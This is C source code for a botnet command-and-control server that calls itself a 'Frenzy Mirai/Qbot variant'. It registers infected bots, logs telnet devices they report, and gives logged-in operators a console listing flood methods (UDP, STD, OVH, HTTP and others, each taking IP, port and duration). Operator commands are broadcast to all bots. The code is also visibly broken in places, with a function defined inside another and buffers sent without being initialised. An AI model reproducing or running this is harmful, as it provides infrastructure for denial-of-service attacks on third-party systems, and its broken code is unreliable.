#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#define MAXFDS 1000000

struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct samuraisLogins {
	char username[100];
	char password[100];
};
static struct samuraisLogins accounts[100];
static volatile FILE *telFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static volatile int OperatorsConnected = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "! BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
					}
				}
			}
		}
	}
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\e[1;95m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char sentattacks[2048];
	memset(sentattacks, 0, 2048);
	char devicecount [2048];
	memset(devicecount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}

		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];

        sprintf(user, "\x1b[96mUsername\e[0m: \e[0m");

		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
        sprintf(password, "\x1b[0mPassword\e[0m: \e[30m", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;

        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0;Soldiers: %d | Users: %d | User: %s %c", '\033', BotsConnected(), OperatorsConnected, accounts[find_line].username, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;
		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		pthread_create(&title, NULL, &TitleWriter, datafd);
        char banner1 [5000];
        char banner2 [5000];
        char banner3 [5000];
        char banner4 [5000];
        char banner5 [5000];
        char banner6 [5000];
        char banner7 [5000];
        char banner8 [5000];
        char banner9 [5000];

        sprintf(banner1, "\x1b[96m              		   ╔═╗╦═╗╔═╗╔╗╔╔═╗╦ ╦\r\n");
        sprintf(banner2, "\x1b[96m              		   ╠╣ ╠╦╝║╣ ║║║╔═╝╚╦╝\r\n");
        sprintf(banner3, "\x1b[96m              		   ╚  ╩╚═╚═╝╝╚╝╚═╝ ╩ \r\n");
        sprintf(banner4, "\x1b[96m         Welcome to Frenzy Mirai/Qbot variant Ran by Vizion\r\n");
        sprintf(banner5, "\x1b[96m                    Type attack for methods Enjoy!\r\n");


        if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner7, strlen(banner7), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner8, strlen(banner8), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) return;
		while(1) {
		char input [5000];
        sprintf(input, "\e[0m[\x1b[96mFrenzy\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

			while(fdgets(buf, sizeof buf, datafd) > 0) {
				if(strstr(buf, "penis")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char help1  [800];
				char help2  [800];
				char help3  [800];
				char help4  [800];
				char help5  [800];
				char help6  [800];
				char help7  [800];
				char help8  [800];

				if(send(datafd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help3,  strlen(help3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help4,  strlen(help4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help5,  strlen(help5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help6,  strlen(help6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help7,  strlen(help7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help8,  strlen(help8), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);

		char input [5000];
        sprintf(input, "\e[0m[\x1b[96mFrenzy\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "attack") || strstr(buf, "ATTACK")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char attack1[500];
        		sprintf(attack1,  "			\e[0m. \x1b[96mSTD \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mUDP \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mZGO \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mZDP \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mNFO \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mOVH \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mVPN \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mVSE \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mRIP \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mECO \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mXTD \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mLDP \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mSDP \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mMEM \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mGME \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mHTTP \e[0m[\x1b[96mIP\e[0m] \e[0m[\x1b[96mPORT\e[0m] \e[0m[\x1b[96mTIME\e[0m]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
        		
        		sprintf(attack1,  "			\e[0m. \x1b[96mSTOP \e[0m[\x1b[96mSTOPS ATTACKS]\r\n");
        		if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0m[\x1b[96mFrenzy\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}

			if(strstr(buf, "CLEAR") || strstr(buf, "clear")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
  		sprintf(clearscreen, "\033[2J\033[1;1H");
  		if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner7, strlen(banner7), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner8, strlen(banner8), MSG_NOSIGNAL) == -1) return;
        if(send(datafd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) return;


				while(1) {
		char input [5000];
        sprintf(input, "\e[0m[\x1b[96mFrenzy\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strlen(buf) > 128 || strstr(buf, "@"))
			{
				FILE*fpc = fopen("crashes.log", "w+");
				fprintf(fpc, "User: %s, Message: %s", accounts[find_line].username, buf);
				char crashmessage[1000];
				sprintf(crashmessage, "[LOGGING] Stop tring to crash the cnc buttface\r\n");
				if(send(datafd, crashmessage, strlen(crashmessage), MSG_NOSIGNAL) == -1) return;
				sleep(1);
				goto end;
			}
			if(strstr(buf, "EXIT") || strstr(buf, "exit")) {
				char exitmessage [2048];
				memset(exitmessage, 0, 2048);
				sprintf(exitmessage, "\e[0mExiting Out Of Server In 3 Seconds...\e[0m", accounts[find_line].username);
				if(send(datafd, exitmessage, strlen(exitmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(3);
				goto end;
			}

        if(strstr(buf, ". UDP")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". LDP")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". STD")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". VSE"))
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". XTD")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". ZGO")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". ZDP")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". NFO")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". OVH")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". STOP")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Stopped.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". VPN")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". RIP")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". ECO")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". SDP")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". MEM")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ". GME")) 
        {
        sprintf(sentattacks, "\e[0mAttack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
            trim(buf);
		char input [5000];
        sprintf(input, "\e[0m[\x1b[96mFrenzy\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("\e[1;95mUser: %s | Command: %s\e[0m\n", accounts[find_line].username, buf);

			FILE *logfile;
            logfile = fopen("logs.log", "a");

            fprintf(logfile, "User: %s | Command: %s\n", accounts[find_line].username, buf);
            fclose(logfile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
	    printf("\x1b[96mWelcome to Frenzy cnc\e[0m\n");
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			printf("\x1b[96m[BOTPORT] [THREADS] [CNCPORT}\e[0m\n");
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "Sin");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}

